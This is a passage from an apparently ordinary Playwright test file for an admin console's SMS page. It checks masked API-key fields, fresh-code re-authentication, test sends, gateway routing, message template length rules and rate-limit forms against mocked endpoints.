        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": {body: sms}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const key = dialog.locator('input[name="gw_sms_ir_api_key"]');
        await expect(key).toHaveValue("");
        // wp10-r2-6: the browser's own manager ignores autocomplete and the data-* opt-outs on a password field, and offers
        // to save or update the console login with the key. It only looks at type=password, so there is none in the dialog:
        // the key is a text input drawn as dots until Show is pressed.
        await expectNoManager(key, "off");
        await expect(dialog.locator('input[type="password"]')).toHaveCount(0);
        await expect(key).toHaveAttribute("type", "text");
        await expect(key).toHaveCSS("-webkit-text-security", "disc");
        await expect(key).toHaveAttribute("spellcheck", "false");
        await expect(key).toHaveAttribute("autocorrect", "off");
        await expect(key).toHaveAttribute("autocapitalize", "none");
        await key.fill("fixture-key-value");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(dialog).toHaveCount(0);
        expect(bodies(mock, "PUT", "/sms/gateways/sms_ir")).toEqual([{credentials: {api_key: "fixture-key-value"}}]);
        // Opened again, nothing of it is there.
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        await expect(page.getByRole("dialog").locator('input[name="gw_sms_ir_api_key"]')).toHaveValue("");
        expect(await page.content()).not.toContain("fixture-key-value");
      });

      test("a masked secret cannot be copied, cut or dragged out until Show is pressed (wp10-r3-7)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": {body: sms}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const key = dialog.locator('input[name="gw_sms_ir_api_key"]');
        await key.fill("fixture-key-value");
        // A script cannot make the browser copy, so the events are sent and what is asked is whether the page cancelled them.
        const cancelled = () =>
          key.evaluate((el) => {
            const clip = (type: string) => {
              const event = new ClipboardEvent(type, {bubbles: true, cancelable: true});
              el.dispatchEvent(event);
              return event.defaultPrevented;
            };
            const drag = new Event("dragstart", {bubbles: true, cancelable: true});
            el.dispatchEvent(drag);
            return {copy: clip("copy"), cut: clip("cut"), drag: drag.defaultPrevented};
          });
        expect(await cancelled()).toEqual({copy: true, cut: true, drag: true});
        // Show is the deliberate way to read it, and then the field is an ordinary one.
        await dialog.getByRole("button", {name: authText(lang as Lang, "fields.password.showLabel")}).click();
        expect(await cancelled()).toEqual({copy: false, cut: false, drag: false});
        await dialog.getByRole("button", {name: authText(lang as Lang, "fields.password.hideLabel")}).click();
        expect(await cancelled()).toEqual({copy: true, cut: true, drag: true});
      });

      test("a browser that cannot draw the mask gets a real password input, never a key in clear text (wp10-r3-5)", async ({page, context, baseURL}) => {
        // What Firefox or an older engine would answer: the property is not known.
        await page.addInitScript(() => {
          const supports = CSS.supports.bind(CSS);
          CSS.supports = ((...args: string[]) => (String(args[0]).includes("text-security") ? false : (supports as (...a: string[]) => boolean)(...args))) as typeof CSS.supports;
        });
        await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": {body: sms}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const key = dialog.locator('input[name="gw_sms_ir_api_key"]');
        await expect(key).toHaveAttribute("type", "password");
        await expect(key).toHaveAttribute("autocomplete", "new-password");
        await expect(key).toHaveAttribute("data-1p-ignore", "true");
        // Show still works.
        await dialog.getByRole("button", {name: authText(lang as Lang, "fields.password.showLabel")}).click();
        await expect(key).toHaveAttribute("type", "text");
      });

      test("Melipayamak takes a username and a password, and says the password is the web service API key", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": {body: mela}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-melipayamak").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog");
        await expect(dialog.getByText(A("sms.edit.melipayamakPasswordHint"))).toBeVisible();
        await expect(dialog.getByText(A("sms.edit.ipNote"))).toBeVisible();
        // One of the two is not enough: the shape is both or neither.
        const user = dialog.locator('input[name="gw_melipayamak_username"]');
        const secret = dialog.locator('input[name="gw_melipayamak_password"]');
        await expectNoManager(user, "off");
        await expectNoManager(secret, "off");
        await expect(dialog.locator('input[name="username"], input[name="password"]')).toHaveCount(0);
        await expect(dialog.locator('input[type="password"]')).toHaveCount(0);
        await expect(secret).toHaveCSS("-webkit-text-security", "disc");
        // Show lifts the mask and Hide puts it back.
        await dialog.getByRole("button", {name: authText(lang as Lang, "fields.password.showLabel")}).click();
        await expect(secret).toHaveCSS("-webkit-text-security", "none");
        await dialog.getByRole("button", {name: authText(lang as Lang, "fields.password.hideLabel")}).click();
        await expect(secret).toHaveCSS("-webkit-text-security", "disc");
        await user.fill("shop");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(0);
        await secret.fill("web-service-key");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/melipayamak")).toEqual([{credentials: {username: "shop", password: "web-service-key"}}]);
      });

      test("a write that needs a fresh code opens the dialog and is repeated once", async ({page, context, baseURL}) => {
        let n = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "PUT /sms/gateways/{provider}": () => (++n === 1 ? err(403, "totp_fresh_required") : {body: sms}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        await page.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        await page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})}).getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        await typeCode(page, "totp_code", CODE);
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/sms_ir").length).toBe(2);
      });

      test("test send: a template and a number, then the state of the queued message is polled", async ({page, context, baseURL}) => {
        let polls = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "POST /sms/gateways/{provider}/test": {status: 202, body: {outbox_id: "20000000-0000-4000-8000-0000000000e1"}},
            "GET /sms/outbox/{id}": () => ({body: ++polls < 2 ? {state: "pending"} : {state: "sent"}}),
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.test")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.test.title", {provider: "sms.ir"})});
        await dialog.locator('input[name="phone"]').fill("09121234567");
        await dialog.getByRole("button", {name: A("sms.test.submit")}).click();
        await expect(page.getByTestId("test-state")).toContainText(A("sms.test.sent", {provider: "sms.ir"}), {timeout: 15_000});
        expect(bodies(mock, "POST", "/sms/gateways/sms_ir/test")).toEqual([{phone: "09121234567", template: "otp", locale: lang}]);
      });

      test("test send that fails shows the closed error code", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "POST /sms/gateways/{provider}/test": {status: 202, body: {outbox_id: "20000000-0000-4000-8000-0000000000e2"}},
            "GET /sms/outbox/{id}": {body: {state: "failed", last_error: "bad_credentials"}},
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.test")}).click();
        await page.locator('input[name="phone"]').fill("09121234567");
        await page.getByRole("dialog").getByRole("button", {name: A("sms.test.submit")}).click();
        await expect(page.getByTestId("test-state")).toContainText("bad_credentials", {timeout: 15_000});
      });

      test("routing: primary and fallback, the same one twice is refused here, and the save is one call", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/routing": {body: {items: [{...mela, role: "primary"}, {...sms, role: "fallback"}]}}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        // Only gateways with credentials can be chosen.
        await form.getByRole("button", {name: /sms\.ir/}).first().click();
        await expect(page.getByRole("option", {name: "noop"})).toHaveCount(0);
        await page.getByRole("option", {name: "Melipayamak"}).click();
        await expect(form.getByRole("button", {name: A("sms.routing.submit")})).toBeEnabled();
        await form.getByRole("button", {name: A("sms.routing.submit")}).click();
        await expect(page.getByText(A("sms.routing.same"))).toBeVisible();
        expect(mock.count("PUT /sms/routing")).toBe(0);
      });

      test("routing saves a different pair", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "GET /sms/gateways": {body: {items: [sms, {...mela, role: "disabled"}]}}, "PUT /sms/routing": {body: {items: [sms, {...mela, role: "fallback"}]}}, "POST /auth/totp/fresh": FRESH}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        await form.locator("button[aria-haspopup]").nth(1).click();
        await page.getByRole("option", {name: "Melipayamak"}).click();
        await form.getByRole("button", {name: A("sms.routing.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/routing")).toEqual([{primary: "sms_ir", fallback: "melipayamak"}]);
      });

      // P1 web merge, B3: main's api/admin-openapi.yaml marks PUT /sms/routing and POST /sms/gateways/{provider}/test admin-fresh too.
      test("routing: a write that needs a fresh code opens the dialog and is repeated once (B3)", async ({page, context, baseURL}) => {
        let n = 0;
        const items = [sms, {...mela, role: "fallback"}];
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/gateways": {body: {items: [sms, {...mela, role: "disabled"}]}},
            "PUT /sms/routing": () => (++n === 1 ? err(403, "totp_fresh_required") : {body: {items}}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        await form.locator("button[aria-haspopup]").nth(1).click();
        await page.getByRole("option", {name: "Melipayamak"}).click();
        await form.getByRole("button", {name: A("sms.routing.submit")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        await typeCode(page, "totp_code", CODE);
        await expect.poll(() => bodies(mock, "PUT", "/sms/routing").length).toBe(2);
      });

      test("test send: a write that needs a fresh code opens the dialog and is repeated once (B3)", async ({page, context, baseURL}) => {
        let n = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "POST /sms/gateways/{provider}/test": () => (++n === 1 ? err(403, "totp_fresh_required") : {status: 202, body: {outbox_id: "20000000-0000-4000-8000-0000000000e2"}}),
            "GET /sms/outbox/{id}": {body: {state: "sent"}},
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.test")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.test.title", {provider: "sms.ir"})});
        await dialog.locator('input[name="phone"]').fill("09121234567");
        await dialog.getByRole("button", {name: A("sms.test.submit")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        await typeCode(page, "totp_code", CODE);
        await expect(page.getByTestId("test-state")).toContainText(A("sms.test.sent", {provider: "sms.ir"}), {timeout: 15_000});
        expect(bodies(mock, "POST", "/sms/gateways/sms_ir/test")).toHaveLength(2);
      });

      test("templates: the live count, the Persian OTP warning above 64 characters, and Save", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/templates/{key}/{locale}": {body: templateFixture({body: "x"})}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        // {code} counts as six digits: "کد ورود شما: " + 6.
        await expect(card.getByTestId("sms-count")).toContainText(lang === "fa" ? "۱۹" : "19");
        await expect(card.getByTestId("otp-refused")).toHaveCount(0);
        const body = card.locator("textarea");
        await body.fill("ک".repeat(66));
        await expect(card.getByTestId("otp-refused")).toBeVisible();
        await body.fill("ک".repeat(64));
        await expect(card.getByTestId("otp-refused")).toHaveCount(0);
        // A line break typed or pasted becomes a space: the API keeps a body on one line.
        await body.fill("one\ntwo {code}");
        await expect(body).toHaveValue("one two {code}");
        await card.getByRole("button", {name: A("sms.templates.save")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/templates/otp/fa")).toEqual([{body: "one two {code}"}]);
      });

      test("templates: a failed save is the form's error with Retry, and only validation_failed is said to be the text", async ({page, context, baseURL}) => {
        // The API client may repeat a 503 by itself, so the answer depends on a state the test changes, not on a call count.
        let answer: "down" | "invalid" | "bare" = "down";
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "PUT /sms/templates/{key}/{locale}": () => (answer === "down" ? err(503, "service_unavailable") : answer === "invalid" ? err(422, "validation_failed", {fields: [{name: "body", code: "invalid"}]}) : err(422, "validation_failed"))},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        await card.locator("textarea").fill("ok {code}");
        await card.getByRole("button", {name: A("sms.templates.save")}).click();
        // wp10-r1-1: the server being down says nothing about the text.
        await expect(card.getByText(errText(lang, "service_unavailable"))).toBeVisible();
        await expect(card.getByText(A("sms.templates.bodyInvalid"))).toHaveCount(0);
        await expect(card.locator("textarea")).not.toHaveAttribute("aria-invalid", "true");
        // Retry sends the same text again; this time the API says the text is wrong.
        answer = "invalid";
        await card.getByRole("button", {name: C("retry")}).click();
        // wp10-r19-1: the real API always attaches `fields`, here body:invalid. The field's own sentence (placeholders, links)
        // must be shown, not the shared "It is not valid." that the code alone would give.
        await expect(card.getByText(A("fieldErrors.body.invalid"))).toBeVisible();
        await expect(card.getByText(A("sms.templates.bodyInvalid"))).toBeVisible();
        await expect(card.getByText(errText(lang, "fields.invalid"))).toHaveCount(0);
        // An older or proxy-shaped answer has no `fields`: the page's own sentence stays the fallback.
        answer = "bare";
        await card.getByRole("button", {name: A("sms.templates.save")}).click();
        await expect(card.getByText(A("sms.templates.bodyInvalid"))).toBeVisible();
        expect(new Set(bodies(mock, "PUT", "/sms/templates/otp/fa").map((b) => JSON.stringify(b)))).toEqual(new Set([JSON.stringify({body: "ok {code}"})]));
      });

      test("templates: a login-code body the API would refuse as more than one billed part is said before Save, in both languages of the template (wp10-r17-1)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/templates": {body: {items: [templateFixture({key: "otp", locale: "fa"}), templateFixture({key: "otp", locale: "en", body: "Your code: {code}"}), templateFixture({key: "otp_reset", locale: "en", body: "Reset: {code}"})]}}},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const save = (card: Locator) => card.getByRole("button", {name: A("sms.templates.save")});
        // Persian: 64 units fit, 65 do not.
        const fa = page.getByTestId("template-otp-fa");
        await fa.locator("textarea").fill("ک".repeat(65));
        await expect(fa.getByTestId("otp-refused")).toContainText(digits(64));
        await expect(save(fa)).toBeDisabled();
        await fa.locator("textarea").fill("ک".repeat(64));
        await expect(fa.getByTestId("otp-refused")).toHaveCount(0);
        await expect(save(fa)).toBeEnabled();
        // English: one letter outside the GSM alphabet is refused however short the text is.
        const en = page.getByTestId("template-otp-en");
        await en.locator("textarea").fill("Votre code: ç {code}");
        await expect(en.getByTestId("otp-refused")).toContainText(A("sms.templates.otpNotGsm"));
        await expect(save(en)).toBeDisabled();
        // The English bound is 160 GSM units; the Persian bound is not the English one.
        await en.locator("textarea").fill("a".repeat(160));
        await expect(en.getByTestId("otp-refused")).toHaveCount(0);
        await en.locator("textarea").fill("a".repeat(161));
        await expect(en.getByTestId("otp-refused")).toContainText(digits(160));
        // The same rule holds for every login-code key, and a key outside the three is not bounded.
        const reset = page.getByTestId("template-otp_reset-en");
        await reset.locator("textarea").fill("é€".repeat(80));
        await expect(reset.getByTestId("otp-refused")).toBeVisible();
        expect(bodies(mock, "PUT", "/sms/templates/otp/en")).toEqual([]);
        expect(bodies(mock, "PUT", "/sms/templates/otp/fa")).toEqual([]);
      });

      test("templates: a 422 body:too_long has its own words, not the placeholder-and-link text (wp10-r17-1)", async ({page, context, baseURL}) => {
        // The text is inside the bound the page knows, so the server's refusal is what is shown (a bound that moved after this build).
        await openAdmin(context, baseURL, {
          handlers: {...base, "PUT /sms/templates/{key}/{locale}": err(422, "validation_failed", {fields: [{name: "body", code: "too_long"}]})},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        await card.locator("textarea").fill("ok {code}");
        await card.getByRole("button", {name: A("sms.templates.save")}).click();
        await expect(card.getByText(A("fieldErrors.body.too_long"))).toBeVisible();
        await expect(card.getByText(A("sms.templates.bodyInvalid"))).toHaveCount(0);
        await expect(card.locator("textarea")).toHaveAttribute("aria-invalid", "true");
      });

      // Question 19 and D67: the two security notices have no placeholder and the one-part bound, and no template of an invite is listed.
      const NOTICES = {
        passkeyFa: "Passkey تازه ثبت شد. شما نبودید؟ رمز Ctrl Z را بازیابی کنید.",
        passkeyEn: "Ctrl Z: a passkey was added to your account. If this was not you, use the forgot password page.",
        recoveryFa: "کدهای بازیابی Ctrl Z عوض شد. شما نبودید؟ کدها و رمز را عوض کنید.",
      };
      const noticeRows = () => ({
        items: [
          templateFixture({key: "notice_passkey", locale: "fa", body: NOTICES.passkeyFa}),
          templateFixture({key: "notice_passkey", locale: "en", body: NOTICES.passkeyEn}),
          templateFixture({key: "notice_recovery", locale: "fa", body: NOTICES.recoveryFa}),
          templateFixture({key: "otp", locale: "fa"}),
        ],
      });

      test("templates: the two notices are listed with the one-part rule, a notice-specific hint, and no template of an invite", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "GET /sms/templates": {body: noticeRows()}, "PUT /sms/templates/{key}/{locale}": {body: templateFixture({key: "notice_passkey", body: "x"})}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        await expect(page.getByTestId("template-notice_passkey-fa")).toBeVisible();
        await expect(page.getByTestId("template-notice_passkey-en")).toBeVisible();
        await expect(page.getByTestId("template-notice_recovery-fa")).toBeVisible();
        await expect(page.getByTestId(/^template-invite-/)).toHaveCount(0);
        const fa = page.getByTestId("template-notice_passkey-fa");
        // The hint says there is no placeholder; it is on a notice and not on a login code, which does take {code}.
        await expect(fa.getByText(A("sms.templates.noticeHint"))).toBeVisible();
        await expect(page.getByTestId("template-otp-fa").getByText(A("sms.templates.noticeHint"))).toHaveCount(0);
        // The seeded body fits one part.
        await expect(fa.getByTestId("otp-refused")).toHaveCount(0);
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        // Persian: 64 units fit, 65 do not, and the words are the notice's, not the login code's.
        await fa.locator("textarea").fill("ک".repeat(65));
        await expect(fa.getByTestId("otp-refused")).toContainText(A("sms.templates.noticeTooLongFa", {limit: digits(64)}));
        await expect(fa.getByRole("button", {name: A("sms.templates.save")})).toBeDisabled();
        await fa.locator("textarea").fill("ک".repeat(64));
        await expect(fa.getByTestId("otp-refused")).toHaveCount(0);
        // English: one letter outside the GSM alphabet is refused.
        const en = page.getByTestId("template-notice_passkey-en");
        await en.locator("textarea").fill("Ctrl Z: ç");
        await expect(en.getByTestId("otp-refused")).toContainText(A("sms.templates.noticeNotGsm"));
        await en.locator("textarea").fill("a".repeat(161));
        await expect(en.getByTestId("otp-refused")).toContainText(A("sms.templates.noticeTooLongEn", {limit: digits(160)}));
        // A notice takes no value: a placeholder is refused before Save, and nothing is sent.
        await en.locator("textarea").fill("Ctrl Z: {code}");
        await expect(en.getByTestId("otp-refused")).toContainText(A("sms.templates.noticeNoCode"));
        await expect(en.getByRole("button", {name: A("sms.templates.save")})).toBeDisabled();
        expect(bodies(mock, "PUT", "/sms/templates/notice_passkey/en")).toEqual([]);
        // A text inside the rule is saved as typed.
        await en.locator("textarea").fill("Ctrl Z: a passkey was added.");
        await en.getByRole("button", {name: A("sms.templates.save")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/templates/notice_passkey/en")).toEqual([{body: "Ctrl Z: a passkey was added."}]);
      });

      test("templates: a 422 body:too_long on a notice has the words that cover notices too (the bound moved after this build)", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/templates": {body: noticeRows()}, "PUT /sms/templates/{key}/{locale}": err(422, "validation_failed", {fields: [{name: "body", code: "too_long"}]})},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-notice_recovery-fa");
        await card.locator("textarea").fill("متن کوتاه");
        await card.getByRole("button", {name: A("sms.templates.save")}).click();
        await expect(card.getByText(A("fieldErrors.body.too_long"))).toBeVisible();
        await expect(card.getByText(A("sms.templates.bodyInvalid"))).toHaveCount(0);
      });

      test("test send of a notice template takes no value: the phone, the template and the language are all it sends", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/templates": {body: {items: [templateFixture({key: "notice_passkey", locale: "fa", body: NOTICES.passkeyFa}), templateFixture({key: "notice_passkey", locale: "en", body: NOTICES.passkeyEn})]}},
            "POST /sms/gateways/{provider}/test": {status: 202, body: {outbox_id: "20000000-0000-4000-8000-0000000000e2"}},
            "GET /sms/outbox/{id}": {body: {state: "sent"}},
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.test")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.test.title", {provider: "sms.ir"})});
        await dialog.locator('input[name="phone"]').fill("09121234567");
        await dialog.getByRole("button", {name: A("sms.test.submit")}).click();
        await expect(page.getByTestId("test-state")).toContainText(A("sms.test.sent", {provider: "sms.ir"}), {timeout: 15_000});
        expect(bodies(mock, "POST", "/sms/gateways/sms_ir/test")).toEqual([{phone: "09121234567", template: "notice_passkey", locale: lang}]);
      });

      test("templates: an sms.ir template id is 1 to 2147483647, and 0 is refused for every gateway (wp10-r17-1)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}/templates/{key}/{locale}": {body: templateFixture()}, "POST /auth/totp/fresh": FRESH}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        const ir = card.getByTestId("mapping-sms_ir");
        const mela = card.getByTestId("mapping-melipayamak");
        const send = (m: Locator) => m.getByRole("button", {name: A("sms.templates.saveMapping")}).click();
        await ir.getByLabel(A("sms.templates.providerId")).fill("2147483648");
        await ir.getByLabel(A("sms.templates.paramNames")).fill("code");
        await send(ir);
        await expect(ir.getByText(A("sms.templates.idInvalidSmsir"))).toBeVisible();
        await ir.getByLabel(A("sms.templates.providerId")).fill("0");
        await send(ir);
        await expect(ir.getByText(A("sms.templates.idInvalidSmsir"))).toBeVisible();
        await mela.getByLabel(A("sms.templates.providerId")).fill("0");
        await mela.getByLabel(A("sms.templates.paramNames")).fill("code");
        await send(mela);
        await expect(mela.getByText(A("sms.templates.idInvalid"), {exact: true})).toBeVisible();
        expect(bodies(mock, "PUT", "/sms/gateways/sms_ir/templates/otp/fa")).toEqual([]);
        expect(bodies(mock, "PUT", "/sms/gateways/melipayamak/templates/otp/fa")).toEqual([]);
        // The largest int32 is taken by sms.ir, and a long id is taken by Melipayamak.
        await ir.getByLabel(A("sms.templates.providerId")).fill("2147483647");
        await send(ir);
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/sms_ir/templates/otp/fa")).toEqual([{provider_template_id: "2147483647", param_names: ["code"]}]);
        await mela.getByLabel(A("sms.templates.providerId")).fill("123456789012345678");
        await send(mela);
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/melipayamak/templates/otp/fa")).toEqual([{provider_template_id: "123456789012345678", param_names: ["code"]}]);
      });

      test("templates: the one-part warning is for the login codes and the notices only, and the English text is counted as GSM-7", async ({page, context, baseURL}) => {
        await openAdmin(context, baseURL, {handlers: base});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-account_exists-en");
        await expect(card.getByTestId("sms-count")).toContainText("GSM-7");
        await card.locator("textarea").fill("a".repeat(161));
        await expect(card.getByTestId("sms-count")).toContainText(lang === "fa" ? "۲" : "2");
        await expect(card.getByTestId("otp-refused")).toHaveCount(0);
      });

      test("templates: a provider template id and its parameter names are one fresh write", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}/templates/{key}/{locale}": {body: templateFixture()}, "POST /auth/totp/fresh": FRESH}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const mapping = page.getByTestId("template-otp-fa").getByTestId("mapping-melipayamak");
        await mapping.getByLabel(A("sms.templates.providerId")).fill("987654");
        await mapping.getByLabel(A("sms.templates.paramNames")).fill("code");
        await mapping.getByRole("button", {name: A("sms.templates.saveMapping")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/melipayamak/templates/otp/fa")).toEqual([{provider_template_id: "987654", param_names: ["code"]}]);
      });

      test("templates: a saved text and a saved mapping leave Save off, however the server writes them back (wp10-r2-4)", async ({page, context, baseURL}) => {
        // The server keeps the body as it cleaned it and the names as a list, so the refetched row holds another spelling.
        let stored = {body: "کد شما {code}", mappings: [] as {provider: string; provider_template_id: string; param_names: string[]}[]};
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/templates": () => ({body: {items: [templateFixture({body: stored.body, mappings: stored.mappings})]}}),
            "PUT /sms/templates/{key}/{locale}": (call) => {
              stored = {...stored, body: String((call.body as {body: string}).body).toUpperCase()};
              return {body: templateFixture({body: stored.body})};
            },
            "PUT /sms/gateways/{provider}/templates/{key}/{locale}": (call) => {
              const b = call.body as {provider_template_id: string; param_names: string[]};
              stored = {...stored, mappings: [{provider: "melipayamak", provider_template_id: b.provider_template_id, param_names: b.param_names}]};
              return {body: templateFixture()};
            },
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        const save = card.getByRole("button", {name: A("sms.templates.save"), exact: true});
        await card.locator("textarea").fill("code is {code}");
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/templates/otp/fa")).toEqual([{body: "code is {code}"}]);
        // The refetched row is upper case, which the admin did not type: the form shows what the server holds, and is clean.
        await expect(card.locator("textarea")).toHaveValue("CODE IS {CODE}");
        await expect(save).toBeDisabled();

        const mapping = card.getByTestId("mapping-melipayamak");
        const saveMapping = mapping.getByRole("button", {name: A("sms.templates.saveMapping")});
        await mapping.getByLabel(A("sms.templates.providerId")).fill("987654");
        await mapping.getByLabel(A("sms.templates.paramNames")).fill("code,brand");
        await saveMapping.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/melipayamak/templates/otp/fa")).toEqual([{provider_template_id: "987654", param_names: ["code", "brand"]}]);
        // The server's list comes back joined as "code, brand": the same list, so there is nothing left to save.
        await expect(mapping.getByLabel(A("sms.templates.paramNames"))).toHaveValue("code, brand");
        await expect(saveMapping).toBeDisabled();
        expect(mock.count("PUT /sms/gateways/{provider}/templates/{key}/{locale}")).toBe(1);
      });

      test("limits: a field for each limit, bounds checked before the call, and the whole object sent", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/limits": {body: limitsFixture({otp_cap_phone: 7})}, "POST /auth/totp/fresh": FRESH}});
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        // Ten numeric fields and the money cap.
        await expect(form.getByRole("textbox")).toHaveCount(11);
        const cooldown = form.getByRole("textbox", {name: A("sms.limits.fields.otp_cooldown_s.label")});
        // The field holds a value to its bounds: 5 seconds becomes 10. An empty field is refused before a request.
        await cooldown.fill("5");
        await cooldown.blur();
        await expect(cooldown).toHaveValue(lang === "fa" ? "۱۰" : "10");
        await cooldown.fill("");
        await cooldown.blur();
        await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        expect(mock.count("PUT /sms/limits")).toBe(0);
        await cooldown.fill("90");
        await cooldown.blur();
        await form.getByRole("textbox", {name: A("sms.limits.fields.otp_cap_phone.label"), exact: true}).fill("7");
        await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([{...limitsFixture(), otp_cap_phone: 7, otp_cooldown_s: 90}]);
      });

      test("limits: a decimal or a negative number is refused with the range message, never turned into another number (wp10-r2-3)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/limits": {body: limitsFixture()}, "POST /auth/totp/fresh": FRESH}});
        await goto(page, "/sms", A("pages.sms.title"));
